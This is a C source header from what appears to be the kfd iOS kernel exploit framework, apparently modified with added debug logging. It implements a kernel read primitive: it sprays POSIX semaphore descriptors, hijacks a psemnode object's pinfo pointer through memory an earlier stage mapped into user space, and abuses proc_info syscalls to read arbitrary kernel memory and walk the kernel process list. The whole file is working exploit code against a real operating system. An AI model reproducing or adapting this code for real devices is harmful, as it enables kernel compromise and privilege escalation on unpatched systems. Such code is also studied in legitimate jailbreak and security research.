/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kread_sem_open_h
#define kread_sem_open_h

const char* kread_sem_open_name = "kfd-posix-semaphore";

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);

void kread_sem_open_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kread.krkw_object_size = sizeof(struct psemnode);

    kfd->kread.krkw_method_data_size = ((kfd->kread.krkw_maximum_id + 1) * (sizeof(i32))) + sizeof(struct psem_fdinfo);
    kfd->kread.krkw_method_data = malloc_bzero(kfd->kread.krkw_method_data_size);

    sem_unlink(kread_sem_open_name);
    i32 sem_fd = (i32)(usize)(sem_open(kread_sem_open_name, (O_CREAT | O_EXCL), (S_IRUSR | S_IWUSR), 0));
    assert(sem_fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[kfd->kread.krkw_maximum_id] = sem_fd;

    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = sem_fd;
    u64 buffer = (u64)(sem_data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
}

void kread_sem_open_allocate(struct kfd* kfd, u64 id)
{
    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    struct psemnode pnodes[4] = {};
    vm_size_t out_size = 0;
    kern_return_t kr = vm_read_overwrite(
        mach_task_self(),
        (vm_address_t)object_uaddr,
        sizeof(pnodes),
        (vm_address_t)pnodes,
        &out_size);
    if (kr != KERN_SUCCESS || out_size != sizeof(pnodes)) return false;

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    if ((pnodes[0].pinfo > PAC_MASK) &&
        (pnodes[0].pinfo != 0) &&
        (pnodes[1].pinfo == pnodes[0].pinfo) &&
        (pnodes[2].pinfo == pnodes[0].pinfo) &&
        (pnodes[3].pinfo == pnodes[0].pinfo) &&
        (pnodes[0].padding == 0) &&
        (pnodes[1].padding == 0) &&
        (pnodes[2].padding == 0) &&
        (pnodes[3].padding == 0)) {
        for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            i32 callnum = PROC_INFO_CALL_PIDFDINFO;
            i32 pid = kfd->info.env.pid;
            u32 flavor = PROC_PIDFDPSEMINFO;
            u64 arg = fds[object_id];
            u64 buffer = (u64)(&data);
            i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
            const u64 shift_amount = 4;

            u64 new_pinfo = pnodes[0].pinfo + shift_amount;
            vm_write(mach_task_self(), (vm_address_t)object_uaddr,
                     (vm_offset_t)&new_pinfo, sizeof(new_pinfo));

            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

            vm_write(mach_task_self(), (vm_address_t)object_uaddr,
                     (vm_offset_t)&pnodes[0].pinfo, sizeof(pnodes[0].pinfo));

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_sem_open_kread_u64);
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    u64 pinfo = 0;
    vm_size_t out_size = 0;
    kern_return_t kr = vm_read_overwrite(
        mach_task_self(),
        (vm_address_t)kfd->kread.krkw_object_uaddr,
        sizeof(u64),
        (vm_address_t)&pinfo,
        &out_size);

    /* Диагностика */
    FILE *_f1 = fopen("/var/mobile/kfd_debug.log", "a");
    if (_f1) {
        fprintf(_f1, "[FIND_PROC] uaddr=0x%llx pinfo=0x%llx kr=%d pid=%d\n",
                (unsigned long long)kfd->kread.krkw_object_uaddr,
                (unsigned long long)pinfo, kr, kfd->info.env.pid);
        fclose(_f1);
    }

    if (kr != KERN_SUCCESS || !pinfo) return;

    u64 pseminfo_kaddr = UNSIGN_PTR(pinfo);
    if (!pseminfo_kaddr) return;

    u64 semaphore_kaddr = 0;
    kread((u64)(kfd),
          pseminfo_kaddr + offsetof(struct pseminfo, psem_semobject),
          &semaphore_kaddr, sizeof(semaphore_kaddr));
    semaphore_kaddr = UNSIGN_PTR(semaphore_kaddr);

    u64 task_kaddr = 0;
    if (semaphore_kaddr) {
        kread((u64)(kfd),
              semaphore_kaddr + offsetof(struct semaphore, owner),
              &task_kaddr, sizeof(task_kaddr));
        task_kaddr = UNSIGN_PTR(task_kaddr);
    }

    FILE *_f2 = fopen("/var/mobile/kfd_debug.log", "a");
    if (_f2) {
        fprintf(_f2, "[FIND_PROC] pseminfo=0x%llx sem=0x%llx task=0x%llx\n",
                (unsigned long long)pseminfo_kaddr,
                (unsigned long long)semaphore_kaddr,
                (unsigned long long)task_kaddr);
        fclose(_f2);
    }

    if (!task_kaddr) return;

    u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
    kfd->info.kaddr.kernel_proc = proc_kaddr;

    for (u64 iter = 0; iter < 1024; iter++) {
        i32 pid = 0;
        kread((u64)(kfd),
              proc_kaddr + dynamic_info(proc__p_pid),
              &pid, sizeof(pid));

        if (iter < 5) {
            FILE *_f3 = fopen("/var/mobile/kfd_debug.log", "a");
            if (_f3) {
                fprintf(_f3, "[FIND_PROC] iter=%llu proc=0x%llx pid=%d\n",
                        (unsigned long long)iter,
                        (unsigned long long)proc_kaddr, pid);
                fclose(_f3);
            }
        }

        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            FILE *_f4 = fopen("/var/mobile/kfd_debug.log", "a");
            if (_f4) {
                fprintf(_f4, "[FIND_PROC] FOUND current_proc=0x%llx\n",
                        (unsigned long long)proc_kaddr);
                fclose(_f4);
            }
            break;
        }

        u64 next = 0;
        kread((u64)(kfd),
              proc_kaddr + dynamic_info(proc__p_list__le_prev),
              &next, sizeof(next));
        next = UNSIGN_PTR(next);
        if (!next || next == proc_kaddr) break;
        proc_kaddr = next;
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    kfd->kread.krkw_method_data = NULL;
}

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    u64 old_pinfo = 0;
    vm_size_t out_size = 0;
    vm_read_overwrite(mach_task_self(),
                      (vm_address_t)kfd->kread.krkw_object_uaddr,
                      sizeof(u64),
                      (vm_address_t)&old_pinfo, &out_size);

    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);
    vm_write(mach_task_self(),
             (vm_address_t)kfd->kread.krkw_object_uaddr,
             (vm_offset_t)&new_pinfo, sizeof(new_pinfo));

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    vm_write(mach_task_self(),
             (vm_address_t)kfd->kread.krkw_object_uaddr,
             (vm_offset_t)&old_pinfo, sizeof(old_pinfo));

    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    u64 old_pinfo = 0;
    vm_size_t out_size = 0;
    vm_read_overwrite(mach_task_self(),
                      (vm_address_t)kfd->kread.krkw_object_uaddr,
                      sizeof(u64),
                      (vm_address_t)&old_pinfo, &out_size);

    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_usecount);
    vm_write(mach_task_self(),
             (vm_address_t)kfd->kread.krkw_object_uaddr,
             (vm_offset_t)&new_pinfo, sizeof(new_pinfo));

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    vm_write(mach_task_self(),
             (vm_address_t)kfd->kread.krkw_object_uaddr,
             (vm_offset_t)&old_pinfo, sizeof(old_pinfo));

    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}

#endif /* kread_sem_open_h */
